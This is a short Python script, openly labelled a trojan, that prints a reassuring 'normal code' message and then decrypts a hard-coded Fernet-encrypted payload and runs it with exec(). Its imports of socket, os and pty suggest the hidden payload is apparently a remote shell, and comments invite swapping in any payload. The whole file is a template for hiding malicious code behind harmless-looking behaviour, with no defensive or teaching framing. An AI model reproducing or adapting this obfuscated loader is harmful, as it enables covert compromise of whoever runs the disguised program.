#The Trojan: It will contain a normal code + encrypted code + decryption engine

#Necessary Modules
from cryptography.fernet import Fernet ; import socket, os, pty
key = "YvCywvNXO77t1f54rdV7-kBq4wHKEBGLy6mPoLlhZas=" 
cipher_suite = Fernet(key)

#The normal code (Add any code you want here)
def normal():
    print("This is a normal code. Don't worry.")
normal()

#The malicious code [Decryption Engine]
def decryption_engine(code):
    encrypted_payload = code
    decrypted_payload = cipher_suite.decrypt(encrypted_payload)
    exec(decrypted_payload)

#The malicious code [Encrypted Code]
encrypted_payload = "gAAAAABgDz_xD9HB9Q3RCuVqxny0YA8EzGIYKZd2QnPfhgu105ZhxV1EGNbtRvWdrXL3CFI78C_1lK0toEZ8fZ_tz_ilAkOikLRjrZedWUkd0x5EEbiuCZcqPXpLcT2C7psi5YEWo18YFJRfMS3gVJfjfCK5abkHaqinC8Y70X3KF6oLcr5GG_Ka9NB2Fh52fr9XI5VVKSaAb5Y8t3XLSpMzr1faMYJNqohNiv-_Fckd8Pn5geKK7IUQr-FzRJi5LBH_sGkknk56ncOc-hIEgwG7DqCvkeUgUI2NIERxLAduIygh7l9oquM=" #Change the payload 
decryption_engine(encrypted_payload) 

